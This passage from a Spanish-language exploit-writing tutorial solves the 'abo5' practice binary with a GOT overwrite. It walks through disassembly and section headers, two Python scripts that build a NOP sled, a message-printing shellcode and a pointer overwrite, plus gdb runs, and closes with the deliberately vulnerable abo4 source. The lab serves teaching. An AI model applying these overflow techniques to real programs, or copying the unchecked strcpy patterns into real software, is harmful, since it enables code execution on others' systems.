    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="err">@</span><span class="n">abos</span><span class="o">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="n">abo5</span> 

<span class="n">Disassembly</span> <span class="n">of</span> <span class="kr">section</span> <span class="p">.</span><span class="n">text</span><span class="o">:</span>
<span class="p">(...)</span>
<span class="mi">8048536</span><span class="o">:</span>    <span class="n">e8</span> <span class="mi">55</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>           <span class="k">call</span>   <span class="mi">8048390</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="p">(...)</span>
</code></pre></div>    </div>

    <p>Y segundo buscamos en la sección <code class="highlighter-rouge">.plt</code> la dirección <code class="highlighter-rouge">0x8048390</code> del <code class="highlighter-rouge">call</code>, donde encontramos definida <code class="highlighter-rouge">exit@plt</code>:</p>
    <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">user</span><span class="err">@</span><span class="n">abos</span><span class="o">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="n">abo5</span> 

   <span class="n">Disassembly</span> <span class="n">of</span> <span class="kr">section</span> <span class="p">.</span><span class="n">plt</span><span class="o">:</span>
   <span class="mi">08048390</span> <span class="o">&lt;</span><span class="n">exit</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span>
   <span class="mi">8048390</span><span class="o">:</span>    <span class="n">ff</span> <span class="mi">25</span> <span class="n">c8</span> <span class="mi">97</span> <span class="mi">04</span> <span class="mi">08</span>        <span class="k">jmp</span>    <span class="o">*</span><span class="mh">0x80497c8</span>
   <span class="mi">8048396</span><span class="o">:</span>    <span class="mi">68</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>           <span class="k">push</span>   <span class="err">$</span><span class="mh">0x20</span>
   <span class="mi">804839</span><span class="n">b</span><span class="o">:</span>    <span class="n">e9</span> <span class="n">a0</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>           <span class="k">jmp</span>    <span class="mi">8048340</span> <span class="o">&lt;</span><span class="n">_init</span><span class="o">+</span><span class="mh">0x2c</span><span class="o">&gt;</span>
</code></pre></div>    </div>

    <p>En la primer línea vemos el salto a <code class="highlighter-rouge">0x80497c8</code>. Tomando en cuenta el proceso de <a href="/guia-escritura-exploits/buffer-overflow/3-got.html#enlazado-din%C3%A1mico-de-librerias-a-binarios">enlazado dinámico de bibliotecas</a>, sabemos que es esa la dirección de <code class="highlighter-rouge">exit</code> dentro de la tabla GOT que queremos modificar para que apunte a nuestro shellcode.</p>

    <p>Es posible ara ver las secciones del ejecutable y corroborar que esa dirección pertenece a la sección <code class="highlighter-rouge">.got</code> (o a la sección <code class="highlighter-rouge">.got.plt</code> más específicamente):</p>

    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">   user@abos:~$</span> readelf <span class="nt">-S</span> abo5
<span class="go">   There are 35 section headers, starting at offset 0x1404:
      
   	Section Headers:
   	  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
   	  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
   		(...)
   	  [12] .plt              PROGBITS        08048340 000340 000080 04  AX  0   0 16
   	  [13] .text             PROGBITS        080483c0 0003c0 0001f2 00  AX  0   0 16
   		(...)
   	  [22] .got              PROGBITS        080497a8 0007a8 000004 04  WA  0   0  4
   	  [23] .got.plt          PROGBITS        080497ac 0007ac 000028 04  WA  0   0  4
   	  [24] .data             PROGBITS        080497d4 0007d4 000008 00  WA  0   0  4
</span></code></pre></div>    </div>

    <p>Efectivamente la dirección <code class="highlighter-rouge">08048390 &lt;exit@plt&gt;</code> pertenece a la sección .plt que empieza en <code class="highlighter-rouge">0x08048340</code> y tiene un tamaño de 80 bytes.</p>

    <p>Y, en cambio, la dirección <code class="highlighter-rouge">0x080497c8 &lt;exit@got&gt;</code> pertenece a la sección .got.plt que empieza en <code class="highlighter-rouge">080497ac</code>y tiene un tamaño de 28.</p>
  </li>
  <li>
    <p>Usamos un único overflow (con <code class="highlighter-rouge">argv[1]</code>) para inyectar el shellcode y sobreescribir la dirección a la que apunta el puntero <code class="highlighter-rouge">pbuf</code>. Y con el segundo argumento de <code class="highlighter-rouge">main()</code> (con <code class="highlighter-rouge">argv[2]</code>) modificamos la dirección en la entrada <code class="highlighter-rouge">exit</code> en la GOT:</p>

    <p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/abo5/exploit.png" alt="input" /></p>
  </li>
  <li>Armamos un archivo en Python para ingresar como primer parámetro el tobogán de nops, nuestro shellcode y la dirección dentro de la GOT a la que va a apuntar <code class="highlighter-rouge">pbuf</code>. Armamos con eso <code class="highlighter-rouge">param1.py</code>.
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
   
<span class="s">"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   
<span class="c">#shellcode, imprime you win</span>
<span class="n">shellcode</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41</span><span class="s">"</span>
   
<span class="n">exit_addr</span>  <span class="o">=</span> <span class="mh">0x080497c8</span>                         <span class="c">#addr exit en GOT</span>
<span class="n">len_buf</span>  <span class="o">=</span> <span class="mi">256</span>

<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">80</span>                          <span class="c">#nops al principio de buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">shellcode</span>                            <span class="c">#shellcode</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">len_buf</span><span class="o">-</span><span class="mi">80</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="c">#nops que completan buf</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">exit_addr</span><span class="p">)</span>                <span class="c">#defino pbuf</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Armamos un archivo en Python para ingresar como segundo parámetro. El objetivo es escribir en la GOT una dirección en el medio del tobogán de nops, no obstante probamos primero con una dirección cualquiera para verificar los cálculos. Armamos <code class="highlighter-rouge">param2.py</code>.
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
   	 
<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x41414141</span>                           <span class="c">#???? addr de buf</span>
   
<span class="n">exploit</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>                  <span class="c">#sobreescribo exit en la GOT</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
    <p>Y probamos ejecutar el abo con ambos parámetros:</p>
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> gdb ./abo5
<span class="go">GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
</span><span class="gp">(gdb) run "$</span><span class="o">(</span>./param1.py<span class="o">)</span><span class="s2">" "</span><span class="k">$(</span>./param2.py<span class="k">)</span><span class="s2">"
</span><span class="go">
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</span></code></pre></div>    </div>
    <p>Logramos que <code class="highlighter-rouge">eip</code> intente ejecutar instrucciones de la dirección <code class="highlighter-rouge">0x41414141</code>. Ahora basta reemplazarla por una dirección en el medio del tobogán de nops.</p>
  </li>
  <li>Averiguamos la dirección de buf en la pila.
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> gdb ./abo5
<span class="go">GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) break main
</span><span class="gp">(gdb) break 13                              ;</span> <span class="nb">break </span>en strcpy<span class="o">(</span>buf..<span class="o">)</span>
<span class="gp">(gdb) run "$</span><span class="o">(</span>./param1.py<span class="o">)</span><span class="s2">" "</span><span class="k">$(</span>./param2.py<span class="k">)</span><span class="s2">"
</span><span class="go">
(gdb) x/wx buf
0xbffff490:  0x00000000
</span></code></pre></div>    </div>
    <p>La dirección de <code class="highlighter-rouge">buf</code> es entonces <code class="highlighter-rouge">0xbffff490</code>. Editamos el script <code class="highlighter-rouge">param2.py</code> con la dirección de <code class="highlighter-rouge">buf</code> más 40 bytes extras para darnos margen y aterrizar en el tobogán de nops:</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /usr/bin/env python</span>
<span class="s">"""Uso: ./abo5 "$(./param1.py)" "$(./param2.py)" """</span>
   
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
       
<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0xbffff490</span><span class="o">+</span><span class="mi">40</span>                     <span class="c">#addr tobogan nops en buf</span>

<span class="n">exploit</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">)</span>               <span class="c">#sobreescribo exit en la GOT</span>
   
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Ejecutamos el exploit en su versión final
    <div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./abo5 <span class="s2">"</span><span class="k">$(</span>./param1.py<span class="k">)</span><span class="s2">"</span> <span class="s2">"</span><span class="k">$(</span>./param2.py<span class="k">)</span><span class="s2">"</span>
<span class="go">you win!
</span></code></pre></div>    </div>
  </li>
</ol>

<h3 id="cómo-seguir">¿Cómo seguir?</h3>
<ol>
  <li><strong>Abo 4</strong>: el programa vulnerable finaliza en un loop infinito (<code class="highlighter-rouge">while(1)</code>), por lo que es factible llevar a cabo una estrategia similar.
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="n">system</span><span class="p">,</span><span class="n">puts</span><span class="p">;</span> 
<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">system</span><span class="p">;</span>
   
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argc</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">pbuf</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

	<span class="n">fn</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">;</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>		
	<span class="n">strcpy</span><span class="p">(</span><span class="n">pbuf</span><span class="p">,</span><span class="n">argc</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="n">fn</span><span class="p">(</span><span class="n">argc</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
   	
   <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </li>
</ol>


</div>

    </div>

  </body>
</html>
